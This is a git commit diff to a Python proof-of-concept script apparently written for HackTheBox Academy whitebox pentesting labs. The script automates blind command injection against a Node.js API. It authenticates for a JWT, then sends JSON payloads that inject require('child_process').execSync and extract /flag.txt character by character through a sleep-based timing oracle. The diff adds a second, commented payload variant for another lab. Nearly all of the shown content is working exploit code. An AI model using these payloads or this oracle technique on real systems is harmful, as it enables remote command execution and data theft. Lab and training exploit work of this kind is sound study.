671f44017674644b6d880ef4ea0fd4f04ae9a6fb
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2024-06-19 08:40:31 -0400

    Update Blind_cmd_injection.py

--- HTBAcademy: POC-Scripts/Blind_cmd_injection.py
+++ HTBAcademy: POC-Scripts/Blind_cmd_injection.py
@@ -1,5 +1,5 @@
 #! /usr/bin/env python3 
-# Created this script to solve the lab called "INTRO TO WHITEBOX PENTESTING: Exploit Development" on HTBAcademy.  
+# Created this script to solve the lab called "INTRO TO WHITEBOX PENTESTING: Exploit Development" and "INTRO TO WHITEBOX PENTESTING: Skills Assessment" on HTBAcademy. 
 
 import requests
 import string
@@ -14,7 +14,8 @@ def blind_cmd_injection():
     headers1={
         "Content-type":"application/json"
             }
-    data1= "{\"email\":\"test@hackthebox.com\"}"
+    data1= "{\"email\":\"test@hackthebox.com\"}" 
+    # This is the data1 used for the "Skills Assessment" lab --> data1= '''{"uid":"2","sid":"johnwickuse440"}'''
     
     # Get jwt token
     response=requests.post(url=f"http://{target}/api/auth/authenticate", data=data1, proxies=proxies, headers=headers1)
@@ -26,12 +27,13 @@ def blind_cmd_injection():
         "Authorization":f"Bearer {token}"
             }
     
-    for num in range(1,30):    
+    for num in range(1,40):    
         for char in charlist:                              
             data2=f'''{{
     "text": "' + require('child_process').execSync('cat /flag.txt | head -c {num} | tail -c {num} | {{ read c; if [ \\"$c\\" = \\"{foundchar}{char}\\" ]; then sleep 2; fi; }}')+ `'`, statusCode: 403}})//"
-    }}'''
-            
+    }}'''  
+            # This is the data2 used for the "Skills Assessment" lab -->  data2=f'''{{"external":"true","ip":"{{\\"ip\\": \\"'- require(\\"child_process\\").execSync(\\"cat /flag.txt | head -c {num} | tail -c {num} | {{ read c; if [ \\\\\\"$c\\\\\\" = \\\\\\"{foundchar}{char}\\\\\\" ]; then sleep 2; fi; }}\\").toString()-'\\"}}"}}'''
+    
             response=requests.post(url=f"http://{target}/api/service/generate", proxies=proxies, headers=headers2, data=data2)
 
             if response.elapsed.total_seconds() > 2:            
@@ -45,6 +47,7 @@ def blind_cmd_injection():
                 if count > 101:
                     break
         if count > 101:
+            print(foundchar)
             break
 try:
     blind_cmd_injection()
